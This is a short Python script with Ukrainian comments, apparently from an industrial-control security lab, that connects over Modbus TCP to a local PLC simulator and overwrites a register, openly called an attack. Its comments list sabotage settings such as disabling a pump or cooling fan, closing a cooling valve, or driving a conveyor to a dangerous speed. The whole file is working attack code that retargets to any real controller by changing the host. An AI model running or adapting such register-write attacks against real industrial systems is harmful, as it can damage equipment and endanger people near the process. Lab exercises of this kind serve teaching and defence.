from pymodbus.client.sync import ModbusTcpClient


PLC_HOST = "127.0.0.1"
PLC_PORT = 5020

# ------------------------------------------------
# CUSTOM ATTACK SETTINGS
# ------------------------------------------------
# Зміни REGISTER і VALUE, щоб створити власну атаку.
#
# Приклади:
# REGISTER = 3, VALUE = 0   -> вимкнути насос
# REGISTER = 5, VALUE = 120 -> небезпечна швидкість конвеєра
# REGISTER = 8, VALUE = 0   -> вимкнути вентилятор охолодження
# REGISTER = 10, VALUE = 0  -> закрити клапан охолодження
# ------------------------------------------------

REGISTER = 5
VALUE = 120


def run_attack():
    """
    Проста атака через Modbus TCP.
    Підключається до PLC Simulator і записує VALUE у REGISTER.
    """

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

    if not client.connect():
        print("Cannot connect to PLC Simulator")
        return

    result = client.write_register(REGISTER, VALUE, unit=1)

    if result.isError():
        print(f"Attack failed: cannot write register {REGISTER}")
    else:
        print(f"Attack executed: register {REGISTER} changed to {VALUE}")

    client.close()


if __name__ == "__main__":
    run_attack()